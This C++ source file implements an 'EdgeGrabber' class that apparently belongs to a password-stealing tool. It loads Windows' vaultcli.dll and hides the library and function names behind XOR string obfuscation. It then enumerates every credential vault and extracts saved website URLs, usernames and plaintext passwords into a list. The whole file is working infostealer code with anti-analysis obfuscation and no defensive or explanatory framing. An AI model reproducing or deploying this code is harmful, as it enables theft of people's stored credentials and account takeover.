#include "EdgeGrabber.h"

string EdgeGrabber::WcharToString(wchar_t * str)
{
	try
	{
		char* buff = new char[wcslen(str) + 1];
		wcstombs(buff, str, wcslen(str) + 1);
		string res = buff;
		delete[] buff;
		return res;
	}
	catch (...) { return ""; }
}

bool EdgeGrabber::Init()
{
	try
	{
		HMODULE hVault = LoadLibraryA(XOR("vaultcli.dll"));
		if (hVault)
		{
			pVaultEnumerateItems = (VaultEnumerateItems)get_proc_address(hVault, XOR("VaultEnumerateItems"));
			pVaultEnumerateVaults = (VaultEnumerateVaults)get_proc_address(hVault, XOR("VaultEnumerateVaults"));
			pVaultFree = (VaultFree)get_proc_address(hVault, XOR("VaultFree"));
			pVaultOpenVault = (VaultOpenVault)get_proc_address(hVault, XOR("VaultOpenVault"));
			pVaultCloseVault = (VaultCloseVault)get_proc_address(hVault, XOR("VaultCloseVault"));
			pVaultGetItem = (PVAULTGETITEM)get_proc_address(hVault, XOR("VaultGetItem"));
			
			return pVaultEnumerateItems && pVaultEnumerateVaults && pVaultFree && pVaultOpenVault && pVaultCloseVault && pVaultGetItem;
		}

		return false;
	}
	catch (...) { return false; }
}

void EdgeGrabber::FillPasswords(vector<Password>& output)
{
	try
	{
		DWORD vaultsCounter, itemsCounter;
		LPGUID vaults;
		HVAULT hVault;
		PVOID items;
		PVAULT_ITEM vaultItems, pVaultItems;

		if (pVaultEnumerateVaults(NULL, &vaultsCounter, &vaults) != ERROR_SUCCESS)
			return;

		for (DWORD i = 0; i < vaultsCounter; ++i)
		{
			if (pVaultOpenVault(&vaults[i], 0, &hVault) == ERROR_SUCCESS) 
			{
				if (pVaultEnumerateItems(hVault, VAULT_ENUMERATE_ALL_ITEMS, &itemsCounter, &items) == ERROR_SUCCESS) 
				{
					vaultItems = (PVAULT_ITEM)items;

					for (DWORD j = 0; j < itemsCounter; ++j)
					{
						const string url = WcharToString(vaultItems[j].Resource->data.String);
						if (url.find(XOR("http")) == string::npos)
							continue;
						const string login = WcharToString(vaultItems[j].Identity->data.String);

						pVaultItems = NULL;

						if (pVaultGetItem(hVault, &vaultItems[j].SchemaId, vaultItems[j].Resource,
							vaultItems[j].Identity, vaultItems[j].PackageSid, NULL, 0, &pVaultItems) == 0) 
						{
							if (pVaultItems->Authenticator != NULL && pVaultItems->Authenticator->data.String != NULL) 
							{
								Password password;
								password.url = url;
								password.login = login;
								password.password = WcharToString(pVaultItems->Authenticator->data.String);
								output.push_back(password);
							}

							pVaultFree(pVaultItems);
						}
					}

					pVaultFree(items);
				}
				pVaultCloseVault(&hVault);
			}
		}

		if (vaults)
		{
			pVaultFree(vaults);
			vaults = NULL;
		}
	}
	catch (...) { return; }
}